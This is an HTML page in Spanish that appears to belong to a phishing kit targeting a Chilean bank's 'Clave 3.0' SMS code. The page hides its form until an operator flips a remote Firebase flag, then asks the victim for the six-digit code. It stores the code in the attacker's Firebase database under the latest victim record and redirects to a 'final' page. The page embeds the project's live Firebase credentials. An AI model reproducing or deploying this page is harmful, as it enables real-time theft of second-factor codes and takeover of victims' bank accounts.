<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Clave 3.0</title>
  <style>
    body { font-family: sans-serif; padding: 20px; text-align: center; }
    #cargando { font-size: 22px; color: red; }
    input { font-size: 24px; padding: 10px; width: 180px; letter-spacing: 8px; text-align: center; }
  </style>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };
    firebase.initializeApp(firebaseConfig);

    function cargar() {
      document.getElementById("formulario").style.display = "none";
      firebase.database().ref("validacion_estado").on("value", snap => {
        if (snap.val() === "siguiente") {
          document.getElementById("cargando").style.display = "none";
          document.getElementById("formulario").style.display = "block";
        }
      });
    }

    function enviarClave(e) {
      e.preventDefault();
      const clave = document.getElementById("clave3").value;
      const timestamp = new Date().toLocaleString("es-CL");

      firebase.database().ref("usuarios").limitToLast(1).once("value").then(snap => {
        const key = Object.keys(snap.val())[0];
        firebase.database().ref("usuarios/" + key).update({
          clave3: clave,
          timestamp: timestamp
        }).then(() => {
          firebase.database().ref("validacion_estado").set(""); // limpiar estado
          window.location.href = "final.html";
        });
      });
    }

    window.onload = cargar;
  </script>
</head>
<body>
  <div id="cargando">Cargando datos...</div>

  <form id="formulario" style="display:none;" onsubmit="enviarClave(event)">
    <h2>Ingresa Clave 3.0 enviada como SMS</h2>
    <input id="clave3" maxlength="6" pattern="\d{6}" required />
    <br><br>
    <button type="submit">Enviar</button>
  </form>
</body>
</html>
